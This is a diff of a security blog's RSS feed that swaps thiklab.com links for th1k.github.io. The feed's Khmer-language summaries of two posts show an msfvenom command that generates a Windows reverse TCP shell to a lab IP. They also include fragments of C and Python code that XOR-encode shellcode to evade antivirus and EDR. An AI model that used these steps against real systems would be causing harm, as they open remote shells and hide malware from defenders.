@@ -7,7 +7,7 @@
   xmlns:media="http://search.yahoo.com/mrss/">
   <channel>
     <title>xor on ThikLab - CyberSec</title>
-    <link>https://thiklab.com/en/tags/xor/</link>
+    <link>https://th1k.github.io/en/tags/xor/</link>
     <description>Recent content in xor on ThikLab - CyberSec</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
@@ -16,23 +16,23 @@
     <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
     <lastBuildDate>Fri, 30 Jun 2023 21:01:06 +0700</lastBuildDate>
     
-        <atom:link href="https://thiklab.com/en/tags/xor/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://th1k.github.io/en/tags/xor/index.xml" rel="self" type="application/rss+xml" />
     
 
       
       <item>
         <title>Encrypting Shellcode with XOR In C</title>
-        <link>https://thiklab.com/en/posts/encrypting-shellcode-with-xor-in-c/</link>
+        <link>https://th1k.github.io/en/posts/encrypting-shellcode-with-xor-in-c/</link>
         <pubDate>Fri, 30 Jun 2023 21:01:06 +0700</pubDate>
         <author>thiklife403@gmail.com (Thik)</author>
         <atom:modified>Fri, 30 Jun 2023 21:01:06 +0700</atom:modified>
-        <guid>https://thiklab.com/en/posts/encrypting-shellcode-with-xor-in-c/</guid>
+        <guid>https://th1k.github.io/en/posts/encrypting-shellcode-with-xor-in-c/</guid>
         <description>Summary ខាងក្រោមជាការបង្កើត Shellcode និងធ្វើកូដនីយកម្ម XOR ដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។
 Generate Shellcode ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។
 1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   Create XOR Encryption 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #include &amp;lt;stdio.h&amp;gt;unsigned char code[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&amp;#34; &amp;#34;\x51\x48\x3\xd2\x65\x48\[Original Shellcode]\x8b\x52\x18\x48&amp;#34; &amp;#34;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&amp;#34;; int main() { char key = &amp;#39;K&amp;#39;; // RIGHT  // char key = &amp;#34;K&amp;#34;; // WRONG  int i = 0; for (i; i&amp;lt;sizeof(code); i++) { printf(&amp;#34;\\x%02x&amp;#34;,code[i]^key); } }   Compile កូដខាងលើនោះយើងនឹងទទួលបាន Encryption Strings ថ្មីមួយ សូមចម្លងវាទុកដើម្បីដាក់ចូលទៅក្នុងកូដខាងក្រោមដើម្បី Decrypt កូដខាងលើ ។</description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://thiklab.comimages/feature2/bam.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://th1k.github.ioimages/feature2/bam.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
@@ -68,18 +68,18 @@ Generate Shellcode ខាងក្រោមជាដំណើរការបង�
       
       <item>
         <title>Process Injection - Bypass AV/EDR with XOR - 0x01</title>
-        <link>https://thiklab.com/en/posts/process-injection-bypass-avedr-with-xor-0x01/</link>
+        <link>https://th1k.github.io/en/posts/process-injection-bypass-avedr-with-xor-0x01/</link>
         <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
         <author>thiklife403@gmail.com (Thik)</author>
         <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
-        <guid>https://thiklab.com/en/posts/process-injection-bypass-avedr-with-xor-0x01/</guid>
+        <guid>https://th1k.github.io/en/posts/process-injection-bypass-avedr-with-xor-0x01/</guid>
         <description>Summary នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ Process Injection ដោយភ្ជាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។
 Shellcode ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។
 1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   XOR Shellcode បន្ទាប់មកយើងនឹងធ្វើការ XOR ទៅលើកូដនោះដោយប្រើប្រាស់ Python Script ដូចខាងក្រោម៖
 1 2 3 4 5 6 7 8 9 10  raw_shellcode = &amp;#34;my shellcode \xaa\xda\xca\[...]\xbe\x14\x49&amp;#34; enc_shellcode = [] print (&amp;#34;[+] Shellcode is encoding&amp;#34;) for opcode in raw_shellcode: enc_opcode = (ord(opcode) ^ 0x41) enc_shellcode.</description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://thiklab.comimages/feature2/bam.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://th1k.github.ioimages/feature2/bam.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
